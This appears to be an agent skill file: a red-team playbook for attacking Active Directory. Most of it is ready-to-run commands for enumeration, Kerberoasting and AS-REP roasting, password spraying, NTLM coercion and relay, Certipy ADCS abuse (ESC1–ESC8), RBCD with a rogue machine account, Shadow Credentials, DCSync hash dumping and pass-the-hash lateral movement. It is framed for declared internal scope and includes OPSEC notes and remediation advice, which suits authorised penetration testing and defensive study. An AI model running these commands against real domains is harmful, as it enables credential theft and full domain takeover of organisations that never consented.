---
name: hunt-active-directory
description: Deep-dive AD attack matrix — enumeration, Kerberoasting/AS-REP, BloodHound, spraying, coercion+relay, ADCS ESC1-ESC8, delegation, ACL abuse, DCSync, lateral movement, OPSEC.
---

# Active Directory — Attack Matrix (deep dive)

Source of truth for internal/AD engagements. Assumes Kali with `netexec` (`nxc`), `impacket`, `bloodhound-python`, `certipy`, `kerbrute`, `evil-winrm`, `responder` installed. **Declared internal/RedTeam scope only.** Route all output to `$OUTPUT_DIR/`.

Convention used below: `$DC` = domain controller IP, `$DOMAIN` = FQDN (e.g. `corp.local`), `$USER`/`$PASS`/`$HASH` = a held credential.

---

## 1. Enumeration

### Unauthenticated / anonymous
```bash
# SMB + null session
nxc smb $DC -u '' -p '' --shares
enum4linux-ng -A $DC
# Anonymous LDAP (naming context, sometimes users)
ldapsearch -x -H ldap://$DC -s base namingcontexts
ldapsearch -x -H ldap://$DC -b "DC=corp,DC=local"
# User enumeration via Kerberos (no creds needed, non-locking)
kerbrute userenum -d $DOMAIN --dc $DC users.txt -o $OUTPUT_DIR/recon/valid-users.txt
```

### Authenticated (any domain user)
```bash
nxc smb $DC -u $USER -p $PASS --users --groups --pass-pol --shares
nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation --admin-count
# ADIDNS dump, GPO, trusts
adidnsdump -u "$DOMAIN\\$USER" -p $PASS $DC
```
**Always read the password policy (`--pass-pol`) BEFORE spraying** — you need the lockout threshold and observation window.

---

## 2. BloodHound graph collection

```bash
# Remote collection (no code on target)
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c all --zip \
  -op $OUTPUT_DIR/loot/bh
# Or on-host: SharpHound.exe -c All --outputdirectory C:\Windows\Temp
```
Import the zip into BloodHound. High-value queries:
- Shortest path from **Owned** principals to **Domain Admins**
- Kerberoastable / AS-REP-roastable users
- Principals with `GenericAll` / `WriteDACL` / `GenericWrite` / `WriteOwner` over high-value objects
- Computers with **unconstrained delegation**; users allowed to delegate (**constrained/RBCD**)
- Sessions of high-value users on reachable hosts (lateral-movement targets)

Mark the chosen path in `$OUTPUT_DIR/attack-chain.md` before executing.

---

## 3. Credential harvesting (offline-crackable)

### Kerberoasting (SPN service accounts)
```bash
nxc ldap $DC -u $USER -p $PASS --kerberoasting $OUTPUT_DIR/loot/kerb.hashes
# or: impacket-GetUserSPNs -request -dc-ip $DC $DOMAIN/$USER:$PASS -outputfile ...
hashcat -m 13100 $OUTPUT_DIR/loot/kerb.hashes $SL_ROCKYOU -r /usr/share/hashcat/rules/best64.rule
```
`$SL_ROCKYOU` = `<(zcat /usr/share/wordlists/rockyou.txt.gz)`. Wordlist paths: see `essential-tools/reference/wordlist-map.md`.

### AS-REP roasting (accounts with DONT_REQ_PREAUTH)
```bash
nxc ldap $DC -u $USER -p $PASS --asreproast $OUTPUT_DIR/loot/asrep.hashes
# unauth (if you have a user list): impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC
hashcat -m 18200 $OUTPUT_DIR/loot/asrep.hashes $SL_ROCKYOU
```

### Password spraying (lockout-aware)
```bash
# ONE password across all users, then WAIT past the observation window. Never loop passwords fast.
kerbrute passwordspray -d $DOMAIN --dc $DC $OUTPUT_DIR/recon/valid-users.txt 'Season2026!' \
  -o $OUTPUT_DIR/loot/spray-hits.txt
```
**Lockout math:** if policy is 5 attempts / 30 min, spray **≤ (threshold-2)** passwords per window per account, spaced across the full observation window. Track attempts so a resumed run doesn't lock accounts. Kerberos pre-auth spraying (kerbrute) does **not** always increment the badPwdCount the same way as SMB — prefer it, but still throttle.

---

## 4. Coercion + relay (no creds → auth as a machine/DC)

Trigger a victim (often a DC) to authenticate to you, relay it to a target that lacks SMB signing or to LDAP/ADCS.

```bash
# Terminal 1: relay to LDAP for RBCD or to ADCS HTTP endpoint for a cert
impacket-ntlmrelayx -t ldaps://$DC --delegate-access      # RBCD shadow
impacket-ntlmrelayx -t http://$CA/certsrv/certfnsh.asp --adcs --template DomainController
# Terminal 2: coerce the DC to auth to relay host
python3 PetitPotam.py $RELAY_IP $DC          # MS-EFSRPC
python3 printerbug.py $DOMAIN/$USER:$PASS@$DC $RELAY_IP   # MS-RPRN (needs a user)
# Others: ShadowCoerce (MS-FSRVP), DFSCoerce (MS-DFSNM), Coercer for a full sweep
```
Relaying a **DC machine account to ADCS** yields a cert you can auth with → full domain compromise (ESC8). Requires SMB signing **not enforced** on the relay target.

---

## 5. ADCS abuse (Certipy) — ESC1 through ESC8

```bash
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout
```
| Case | Condition | Exploit |
|---|---|---|
| **ESC1** | Template allows enrollee-supplied SAN + client-auth EKU | `certipy req ... -template X -upn administrator@$DOMAIN` → auth as DA |
| **ESC2** | Any-Purpose / SubCA EKU | Request cert, use for auth |
| **ESC3** | Enrollment Agent template | Request agent cert, enroll on behalf of DA |
| **ESC4** | Vulnerable template ACL (you can edit it) | Rewrite template to be ESC1, then ESC1 |
| **ESC6** | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` | Any template → supply SAN |
| **ESC7** | You hold CA `ManageCA`/`ManageCertificates` | Enable SAN flag or approve requests |
| **ESC8** | HTTP enrollment endpoint (web enrollment) | NTLM-relay a machine/DC → cert (see §4) |
```bash
certipy req -u $USER@$DOMAIN -p $PASS -ca 'CORP-CA' -template 'VulnTemplate' \
  -upn administrator@$DOMAIN -dc-ip $DC
certipy auth -pfx administrator.pfx -dc-ip $DC     # → NT hash / TGT
```

---

## 6. Kerberos delegation

| Type | Signal (BloodHound / LDAP) | Exploit |
|---|---|---|
| **Unconstrained** | `TrustedForDelegation` on a computer | Coerce a DC to auth to it → capture DC TGT in memory → DCSync |
| **Constrained** | `msDS-AllowedToDelegateTo` set | S4U2self+S4U2proxy to impersonate any user to the allowed SPN |
| **RBCD** | You can write `msDS-AllowedToActOnBehalfOfOtherIdentity` | Add a controlled machine account, S4U to impersonate DA to target |
```bash
# RBCD example (you have GenericWrite over TARGET$)
impacket-addcomputer -computer-name 'evil$' -computer-pass 'P@ss' $DOMAIN/$USER:$PASS
impacket-rbcd -delegate-from 'evil$' -delegate-to 'TARGET$' -action write $DOMAIN/$USER:$PASS
impacket-getST -spn cifs/target.$DOMAIN -impersonate administrator -dc-ip $DC $DOMAIN/evil\$:'P@ss'
```

---

## 7. ACL abuse (BloodHound edges → domain takeover)

| Edge you hold | Abuse |
|---|---|
| `GenericAll` / `GenericWrite` on a user | Set SPN → Kerberoast, or set DONT_REQ_PREAUTH → AS-REP, or reset shadow creds |
| `WriteDACL` / `WriteOwner` on a group/OU | Grant yourself the right, then add self to group |
| `ForceChangePassword` | Reset the user's password (get approval — impacts a real account) |
| `AddKeyCredentialLink` | **Shadow Credentials**: `certipy shadow auto -account victim ...` → NT hash without touching the password |
| `GenericAll` on a computer | RBCD (§6) |

Prefer **Shadow Credentials** over password resets — non-destructive and stealthier.

---

## 8. DCSync (replication → all hashes)

Requires `DS-Replication-Get-Changes` + `-All` (Domain Admins, or granted via ACL abuse).
```bash
impacket-secretsdump -just-dc-user administrator $DOMAIN/$USER:$PASS@$DC   # target one account
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC                              # full dump (loud, scope it)
```
The `krbtgt` hash enables golden tickets — **do not create persistence tickets on production without explicit written approval**; note the capability in the report instead.

---

## 9. Lateral movement matrix

| Primitive | Tool | Notes |
|---|---|---|
| Pass-the-hash | `nxc smb $HOST -u admin -H $HASH -x whoami` | Works with local or domain NT hash |
| Pass-the-ticket | `export KRB5CCNAME=tgt.ccache; nxc smb $HOST -k` | From Kerberoast/S4U/coercion |
| Overpass-the-hash | `impacket-getTGT $DOMAIN/user -hashes :$HASH` | NT hash → TGT |
| Exec: SMB | `impacket-psexec` / `nxc smb -x` | Noisy (service creation) |
| Exec: WMI | `impacket-wmiexec` | Quieter, no service |
| Exec: WinRM | `evil-winrm -i $HOST -u admin -H $HASH` | Needs 5985/5986 |
| Exec: DCOM/SchTasks | `impacket-dcomexec` / `atexec` | Alternatives when above blocked |

Enumerate where high-value users have sessions (BloodHound) and target those hosts for token/ticket theft (see `privilege-escalation` for local harvest).

---

## 10. OPSEC & detection awareness

- **Kerberoasting** with RC4 (etype 23) requests is a classic detection (event 4769). Weigh AES vs RC4; note that requesting RC4 is what makes cracking feasible.
- **DCSync** generates 4662 with the replication GUIDs — very detectable; do it deliberately, once, and record it.
- **Coercion** leaves EFSRPC/RPRN traces; **golden/silver tickets** and **DCShadow** are high-risk persistence — out of scope unless explicitly authorized.
- Spraying trips 4625 storms and can lock accounts — throttle (§3). If a blue team is in play, coordinate per `mid-engagement-ir-detection`.
- Capture every hop's evidence (command, output, timestamp) to `$OUTPUT_DIR/findings/finding-NNN/`; redact hashes/tickets per `evidence-hygiene` before they enter the report.

## Validation checklist (per finding)

1. Reproduced the primitive from a clean context (not a cached ticket).
2. Demonstrated concrete impact (auth as target principal / file read / code exec) — not just "roastable".
3. Impact scoped to declared targets only.
4. Evidence chain complete and redacted.
5. Remediation stated (e.g., strong service-account passwords + gMSA, disable RC4, enforce SMB signing, remove EDITF flag, tier-0 isolation).
